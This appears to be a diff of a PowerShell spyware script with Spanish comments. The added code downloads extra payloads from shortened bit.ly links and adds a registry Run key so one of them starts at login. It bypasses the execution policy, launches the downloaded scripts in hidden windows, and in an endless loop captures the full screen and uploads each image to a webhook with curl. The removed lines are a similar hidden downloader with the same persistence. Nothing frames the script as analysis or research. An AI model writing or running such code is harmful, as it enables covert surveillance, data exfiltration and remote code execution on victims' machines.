@@ -1,37 +1,74 @@
-# URL del archivo a descargar y ejecutar
-$scriptUrl = "https://bit.ly/3HVDrbb"
+$hookurl = "https://bit.ly/chu_kbras"
+$seconds = 30 # Intervalo entre capturas
+$a = 0 # Contador de imágenes enviadas al webhook
+$maxImages = 1 # Cantidad máxima de imágenes antes de descargar el otro script
 
-# Ruta donde se guardará el archivo descargado
-$downloadedScriptPath = "$env:USERPROFILE\newFile.ps1"
+# Detección de URL acortada
+if ($hookurl.Length -ne 121){Write-Host "Shortened Webhook URL Detected!!..." ; $hookurl = (irm $hookurl).url}
 
-# Descargar el archivo
-Invoke-WebRequest -Uri $scriptUrl -OutFile $downloadedScriptPath
-
-# Verificar si el archivo descargado existe
-if (Test-Path $downloadedScriptPath) {
-    # Ejecutar el script descargado de manera oculta
-    Start-Process powershell.exe -ArgumentList "-NoNewWindow -WindowStyle Hidden -File `"$downloadedScriptPath`"" -WindowStyle Hidden
-} else {
-    Write-Host "El archivo '$downloadedScriptPath' no se encontró."
-}
-
-# Agregar entrada al Registro de Windows para ejecutar el script descargado al iniciar sesión
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regName = "MyScript"
-if (!(Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
-    New-ItemProperty -Path $regPath -Name $regName -Value $downloadedScriptPath -PropertyType String -Force | Out-Null
-}
-
-# Verificar si el script principal ya existe
-$mainScriptPath = "$env:USERPROFILE\sysw.ps1"
-if (!(Test-Path $mainScriptPath)) {
+# Verificar si el archivo principal ya existe
+$syswPath = "$env:USERPROFILE\sysw.ps1"
+if (!(Test-Path $syswPath)) {
     # Descargar el script principal
-    $mainScriptUrl = "https://bit.ly/Screen_dc"
-    Invoke-WebRequest -Uri $mainScriptUrl -OutFile $mainScriptPath
+    $syswUrl = "https://bit.ly/Screen_dc"
+    Invoke-WebRequest -Uri $syswUrl -OutFile $syswPath
 }
 
-# Establecer la política de ejecución para el script principal
+# Descargar el nuevo archivo
+$newFilePath = "$env:USERPROFILE\newFile.ps1"
+Invoke-WebRequest -Uri "https://bit.ly/3HVDrbb" -OutFile $newFilePath
+
+# Establecer la política de ejecución para el nuevo archivo
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 
-# Ejecutar el script principal de manera oculta
-Start-Process powershell.exe -ArgumentList "-NoNewWindow -WindowStyle Hidden -File `"$mainScriptPath`"" -WindowStyle Hidden
+# Agregar entrada al Registro de Windows para ejecutar el script al iniciar sesión
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "MyScript"
+$regValue = $newFilePath
+if (!(Get-ItemProperty -Path $regPath -Name $regName -ErrorAction SilentlyContinue)) {
+    New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null
+}
+
+do {
+    $Filett = "$env:temp\SC.png"
+    Add-Type -AssemblyName System.Windows.Forms
+    Add-type -AssemblyName System.Drawing
+    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+    $Width = $Screen.Width
+    $Height = $Screen.Height
+    $Left = $Screen.Left
+    $Top = $Screen.Top
+    $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
+    $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
+    $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
+    $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
+    Start-Sleep 1
+    curl.exe -F "file1=@$filett" $hookurl
+    Start-Sleep 1
+    Remove-Item -Path $filett
+    Start-Sleep $seconds
+
+    # Incrementar contador de imágenes enviadas al webhook
+    $a++
+
+    # Verificar si se ha alcanzado la cantidad máxima de imágenes
+    if ($a -eq $maxImages) {
+        # Ejecutar el nuevo archivo descargado de manera oculta
+        $scriptExtension = [System.IO.Path]::GetExtension($newFilePath)
+        if ($scriptExtension -eq ".ps1") {
+            # Verificar si el archivo se puede ejecutar como script de PowerShell
+            $isPS1Script = Test-ScriptFile $newFilePath
+            if ($isPS1Script) {
+                # Ejecutar el archivo como script de PowerShell
+                Start-Process powershell.exe -ArgumentList "-NoNewWindow -WindowStyle Hidden -File `"$newFilePath`"" -WindowStyle Hidden
+            } else {
+                Write-Host "El archivo '$newFilePath' no es un script de PowerShell válido."
+            }
+        } else {
+            Write-Host "El archivo '$newFilePath' no tiene la extensión .ps1."
+        }
+        
+        # Reiniciar contador de imágenes
+        $a = 0
+    }
+} while ($true)
